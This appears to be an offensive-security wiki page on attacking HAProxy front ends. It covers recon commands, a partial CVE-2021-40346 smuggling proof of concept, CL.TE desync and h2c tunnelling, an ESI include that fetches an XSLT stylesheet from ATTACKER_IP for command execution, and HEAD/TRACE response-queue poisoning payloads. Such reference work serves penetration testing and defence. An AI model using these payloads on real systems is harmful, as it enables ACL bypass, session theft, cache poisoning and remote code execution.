---
technology: "HAProxy"
kind: implementation
audience: offensive-security
family: network-services
parent-area: http-proxy
layer: TCP/HTTP load balancer and reverse proxy (80/443 fronting, ACL layer, htx HTTP parser, stats page/socket, ESI-capable caches behind it)
language: C
first-released: 2000 (Willy Tarreau lineage)
license: GPLv2
homepage: "https://www.haproxy.org"
github-repo: "https://github.com/haproxy/haproxy"
evidence: "pass 2 gate 2026-11-12 (../internal coverage ledger): 3 writeups attack HAProxy itself — CVE-2021-40346 header-smuggling PoC against a 2.2.16 front (ACL bypass to a denied path), CL.TE desync on a Via-disclosed HAProxy 1.9.10 (vertical-tab Transfer-Encoding against a chunked-preferring backend), haproxy.cfg loot + h2c upgrade smuggling through a 2.x front to ACL-denied paths; a 4th writeup contributes the ESI-injection-to-RCE pattern (ESIGate engine behind the front tier) carried here as the edge-include family. Gate >=3 met; squid (the forward-proxy sibling) already has its own unit at ../squid/."
status: evidence-gated
provenance: "corpus-grounded (see evidence line) + upstream-verified 2026-11-12: haproxy.com vendor advisory 'September/2021 — CVE-2021-40346 Duplicate Content-Length Header Fixed' (affected 2.0/2.2/2.3/2.4, fixed 2.0.25/2.2.17/2.3.14/2.4.4 + deny-if-duplicate-CL workaround), JFrog technical analysis of the htx_add_header integer overflow (name length mod-256, value-length bit spill), NVD CPE ranges, haproxy.com stats-page documentation (stats enable / stats uri / stats auth, dedicated stats frontend convention), W3C ESI Language Specification 1.0 and Varnish do_esi docs for the include-processing tier, BishopFox h2csmuggler project for the h2c upgrade technique. Wave 4 HT enrichment 2026-11-13: move 5 (response-queue desync: two-complete-requests queue poisoning, HEAD content-length amplifier, TRACE reflection gadget, cache poisoning/splitting, pipelining false-positive discipline; upstream framing from PortSwigger's TRACE-desync research and DEF CON 29 response-smuggling work as cited in the source) rewritten from HackTricks (src/pentesting-web/http-response-smuggling-desync.md), CC BY-NC 4.0, accessed 2026-11-13."
---

# HAProxy

> The box in front of the app whose *entire job* is deciding which HTTP requests are allowed through — which makes "get a request past it that it parsed differently than the backend does" the whole attack surface.

*Implementation page of the [[http-proxy]] area. HAProxy appears both as the reverse-proxy/ACL front tier (its dominant role) and occasionally as a generic proxy hop; this page covers what you attack when the front door is HAProxy.*

## Identity and fingerprint

```text
80/tcp open http-proxy HAProxy http proxy 2.0.0 or later   # nmap service detection
Via: haproxy                                               # deployment-added tell (fronting hop)
# an incomplete/malformed request answered by an error page often carries the version
```

HAProxy (haproxy.org, C, GPLv2) fronts more production web estates than any other open-source load balancer: it terminates the client connection, applies the frontend's ACL rules, and forwards to a backend pool. Versions 2.0+ parse HTTP with the internal **htx** representation — that parser has its own CVE history, so the minor version is the gate for everything below. The `Server:` header is routinely masked, so lean on nmap's behavior-based line above, response `Via`/error-page tells, and — once you can read the box — the config itself.

Config loot (`/etc/haproxy/haproxy.cfg`) is the best recon on any HAProxy host, and it is the deny-list you must beat:

```text
frontend http_front
    acl restricted_page path_beg,url_dec -i /logs
    http-request deny if restricted_page     # <- your bypass target, named explicitly
    stats socket /run/haproxy/admin.sock mode 660 level admin
    chroot /var/lib/haproxy
backend http_back
    server server1 127.0.0.1:6081 check      # <- hidden backend (here: a cache on loopback)
```

Read it for: every `http-request deny`/`redirect` ACL (exactly what stands between you and the interesting paths), the backend `server` lines (loopback and internal-LAN services you cannot see from outside — caches, app nodes, admin ports), the stats socket path, and TLS material paths. The **stats page** is a second oracle: a `stats enable` frontend (classic default URI `/haproxy?stats`; modern convention a dedicated port such as 8404 at `/stats`, optionally behind `stats auth` Basic) lays out every frontend, backend, and server with health and request counters — and `stats admin`-enabled pages let you drain servers (a denial-of-service lever, treat with care).

## The moves

### 1. CVE-2021-40346 — htx integer-overflow header smuggling (ACL bypass)

An integer overflow in `htx_add_header` exists in HAProxy 2.0 through the 2.5 dev line: the htx block encodes a header's **name length in 8 bits** (256 values), and a crafted header whose *name* is longer than 255 bytes overflows that field — the excess bit spills into the value-length field, so the re-serialization pass reads a **different header** than the parsing pass stored. The vendor frames the result as a duplicate `Content-Length` check bypass; the practical result is HTTP request smuggling past every `http-request` ACL. Fixed in **2.0.25, 2.2.17, 2.3.14, 2.4.4** (vendor advisory with the same numbers; 2.2.16 exploited in the field). Vendor workaround when patching is impossible: `http-request deny if { req.hdr_cnt(content-length) gt 1 }`.

Exploit shape — a POST whose first header *name* is a 255+-byte monster built so the mangled re-read becomes a content-length, with the smuggled request in the body:

```python
sock.connect(("example.com", 80))
longhdr = b"Content-Length0" + b"a" * 252 + b":"          # name > 255 bytes total
payload = b"GET /admin/ HTTP/1.1\r\nHost: example.com\r\n\r\n"
data    = (b"POST / HTTP/1.1\r\nHost: example.com\r\n" + longhdr +
           b"\r\nContent-Length: " + str(len(payload)).encode() + b"\r\n\r\n" + payload)
```

Raw sockets, not Burp — the `\r\n` placement is the payload. The response that eventually comes back belongs to the smuggled request, which never passed the ACLs (field-observed reaching a path the front explicitly denied). Impact class: ACL bypass, data exposure, session hijacking, cache poisoning.

### 2. CL.TE desync — the front/back disagreement class

Request smuggling does not need a CVE whenever the front and the backend disagree about a request's length. HAProxy prefers `Transfer-Encoding` over `Content-Length` when both are present — but releases of the 1.9 era (1.9.10 demonstrated in the field) stop recognizing the TE header when an unusual byte leads its value, and fall back to `Content-Length`. A backend that still honors the chunked TE then splits the message differently: classic **CL.TE** desync.

```text
Transfer-Encoding: [VT]chunked        # 0x0B vertical tab before "chunked"
```

The field chain paired exactly this HAProxy behavior with a chunked-preferring application server whose own chunked handling was fixed one patch later — front reads by Content-Length, backend splits on the chunked framing, and the surplus bytes become the *prefix of the next victim's request* on the shared connection. Fingerprint the front first: a `Via:` header naming haproxy, and version disclosure from error replies to incomplete requests. The desync payload then rides a normal-looking POST (keep-alive connection, chunked body whose terminator is positioned so the appended `POST /comment ...` of a second, larger message gets prepended to whatever the next user sends). Value: act as another user (session cookies ride their request), poison caches, bypass front-side auth/ACL rules that only see request one.

### 3. h2c upgrade smuggling — tunnel under the ACLs

HTTP/1.1 to HTTP/2 cleartext upgrade (`Upgrade: h2c` + `Connection: Upgrade, HTTP2-Settings`): when HAProxy forwards the upgrade headers to a backend that accepts h2c, the backend's `101 Switching Protocols` turns the proxied connection into a **blind TCP tunnel** — the front stops interpreting (and enforcing anything on) the traffic. Every HTTP/2 request inside the tunnel then reaches the backend untouched by the frontend ACLs that denied your HTTP/1.1 attempts (field-observed against `http-request deny`-protected `/logs` and `/download` paths).

```bash
python3 h2csmuggler.py -x http://example.com http://example.com/logs
# [-] INFO: h2c stream established -> arbitrary paths behind the ACLs, incl. POSTs with cookies
```

Gates: the front must forward the upgrade headers (default behavior in configs that pass websockets through), and the backend must genuinely speak h2c (Go services with the h2c handler, some Python/Node setups). Detection costs one request — try the upgrade and see if a 101 comes back.

### 4. ESI injection behind the edge tier

HAProxy does not process **ESI (Edge Side Includes)** itself — but it is routinely deployed *in front of* the tier that does: Varnish with `do_esi`, Squid's ESI support, CDN edges, and application-level ESI engines (the ESIGate family). Wherever a tier expands `<esi:include>` markup in response bodies, attacker-controlled content that survives into a processed response becomes a fetch-and-execute primitive:

```xml
<esi:include src="http://example.com/" stylesheet="http://ATTACKER_IP/esi.xsl"/>
```

The `stylesheet` attribute is the kill chain: the processor applies attacker-supplied **XSLT**, and XSLT is code — the field instance (an ESIGate-class engine, fingerprinted by its `X-Powered-By:` response header) executed arbitrary commands from an XSL stylesheet. Hunt for it whenever a response smells of templating at the edge (`Surrogate-Control: ESI`, `X-Powered-By: Esigate`, include markers in source), or whenever reflected/stored content you control is served through a Varnish/ESI-configured path. The injection lands as the web user; report the include-processing tier by name since that is the vulnerable component, not the load balancer in front of it.

### 5. Response-queue desync — the response-side payoffs of any desync primitive

Moves 1-2 buy a request-level desync; the response side is where it becomes victim-facing. The difference from prefix-smuggling: send TWO COMPLETE requests (not one-and-a-half) so the front/back pair disagree about which RESPONSE belongs to which request, and make the smuggled one SLOW (a long-running endpoint) so the queues are still crossed when the next request arrives. Then: a victim's request lands in the queue behind yours and receives the response to YOUR smuggled request; your follow-up request receives the victim's response — headers, `Set-Cookie`, body and all. One payload can inject many responses and desync many users (also a DoS lever), and request-theft works WITHOUT any persistent storage — the reflected parameter of a normal endpoint is enough.

The `HEAD` amplifier: a HEAD response carries `Content-Length` but no body, so when a smuggled HEAD's response heads to the victim, the proxy waits for body bytes that never come — the NEXT queued response (also yours) becomes the missing body. Control that body and you get:

- **Content confusion** — attacker-controlled bytes served as the victim's "body" with the HEAD's legit `Content-Type`: XSS without an XSS on the page.
- **Response splitting** — size the injected bytes to the HEAD's Content-Length so the concatenation parses as a complete forged response; the NEXT victim gets a 100% attacker-crafted one (cacheable → poisoning).
- **TRACE as the reflection gadget** — no reflective endpoint? Smuggle `TRACE` with padded attacker headers: the backend reflects the request (including proxy-added headers like `X-Forwarded-For` and any downgraded start-line) back as the body, and a smuggled TRACE is invisible to the front-end/WAF that would block it at the edge — a recon bonus: you see exactly how the proxy rewrites requests.

```http
GET / HTTP/1.1
Host: example.com
Content-Length: 150

HEAD / HTTP/1.1
Host: example.com

TRACE / HTTP/1.1
Host: example.com
X-Pad: ...padding...
X: <script>alert(1)</script>
```

Testing honesty (the classic false positive): queue poisoning only counts when it survives WITHOUT connection reuse tricks — retest with `requestsPerConnection=1` and no Repeater grouping, or you may have desynchronized only your own client. A genuine parser discrepancy usually reproduces through an HTTP/2→HTTP/1 downgrade path as a nested HTTP/1 response inside a single response. Beyond HEAD: response-side TE.CL / dechunk-vs-length mismatches, response-order bugs in multi-endpoint frameworks, and CGI/FastCG gateway header leakage are the same class — test response translation layers even when request-side checks look clean.

## Recon quick hits on an HAProxy front

```bash
curl -sI http://198.51.100.x/                     # Via / Server / error-page tells
printf 'GET / HTTP/1.1\r\nHost: x\r\n' | nc 198.51.100.x 80   # incomplete request -> version leak
curl -s http://198.51.100.x/haproxy?stats         # classic default stats URI
curl -s http://198.51.100.x:8404/stats            # dedicated stats frontend convention
python3 h2csmuggler.py -x http://example.com http://example.com/   # 101 = tunnel gate open
cat /etc/haproxy/haproxy.cfg                      # post-shell: ACL deny-list + backends (needs read)
```

Version discipline: the 2.0–2.5 window gates move 1 (per-release fix levels above), the 1.9 era gates the TE-degeneration in move 2, and h2c/ESI are configuration questions, not version questions.

## Where to go next

- [[http-proxy]] — the area router (which proxy tier is this?), and [[squid|Squid]] for the forward-proxy sibling: enumeration *through* a proxy rather than attacks *on* it.
